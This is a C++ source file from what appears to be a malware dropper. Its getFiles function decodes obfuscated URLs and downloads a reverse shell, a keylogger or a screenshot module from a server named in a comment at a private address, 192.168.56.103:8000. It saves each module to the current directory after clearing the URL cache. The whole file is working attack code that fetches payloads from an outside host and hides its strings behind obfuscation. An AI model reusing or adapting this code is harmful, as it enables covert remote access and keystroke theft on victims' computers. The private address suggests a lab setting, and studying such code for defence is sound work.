#include "pch.h"
#include "getfile.h"
#include "obfuscate.h"

BOOL getFiles(int module)
{
	// URL : http://192.168.56.103:8000/

	char p[MAX_PATH];

	GetCurrentDirectoryA(MAX_PATH, p);

	std::string path(p);

	HRESULT result;

	if (module == 1)
	{
		char reverseShell[43];
		strcpy(reverseShell, obf::decode("\xc6\xff\xdc\xe7\xb6\x82\xa3\x8f\x80\x9c\xba\xaf\xa3\x9e\x97\xca\x98\xa5\x99\xa7\xbf\x97\xb4\x8e\x89\x9e\xbb\xec\xf0\xd0\xdc\x8d\xdd\xee\xdb\xff\xe9\xc1\xe0\x90\xdd\xc2\xf8").c_str());
		
		std::string reverseShellPath = path + obf::decode("\xf2\xd7\xda\xf2\xfa\xc8\xfe\xcd\xdc\xdd\xfc\xfb\xf9\xca\x97\x9b\xc2\xe7");

		DeleteUrlCacheEntryA(reverseShell);

		result = URLDownloadToFileA(NULL, reverseShell, reverseShellPath.c_str(), 0, NULL);

		if (result == S_OK) return TRUE;
		else return FALSE;
	}
	else if (module == 2)
	{
		char keylogger[40];
		strcpy(keylogger, obf::decode("\xc6\xff\xdc\xe7\xb6\x82\xa3\x8f\x80\x9c\xba\xaf\xa3\x9e\x97\xca\x98\xa5\x99\xa7\xbf\x97\xb4\x8e\x89\x9e\xbb\xf5\xf0\xdf\xd5\x90\xc9\xec\xcd\xe5\xa2\xc9\xe0\xd2").c_str());

		std::string keyloggerPath = path + obf::decode("\xf2\xd7\xc3\xf2\xf5\xc1\xe3\xd9\xde\xcb\xe6\xb0\xf1\xca\xd5");

		DeleteUrlCacheEntryA(keylogger);

		result = URLDownloadToFileA(NULL, keylogger, keyloggerPath.c_str(), 0, NULL);

		if (result == S_OK) return TRUE;
		else return FALSE;
	}
	else if (module == 3)
	{
		char screenshot[41];
		strcpy(screenshot, obf::decode("\xc6\xff\xdc\xe7\xb6\x82\xa3\x8f\x80\x9c\xba\xaf\xa3\x9e\x97\xca\x98\xa5\x99\xa7\xbf\x97\xb4\x8e\x89\x9e\xbb\xed\xf6\xd4\xdc\x9a\xc0\xf8\xc0\xf8\xf8\x83\xe8\xd2\xd5").c_str());

		std::string screenshotPath = path + obf::decode("\xf2\xd7\xdb\xf4\xfe\xc8\xe9\xd0\xca\xc6\xfb\xea\xbb\xc2\xd5\x93");

		DeleteUrlCacheEntryA(screenshot);

		result = URLDownloadToFileA(NULL, screenshot, screenshotPath.c_str(), 0, NULL);

		if (result == S_OK) return TRUE;
		else return FALSE;
	}
}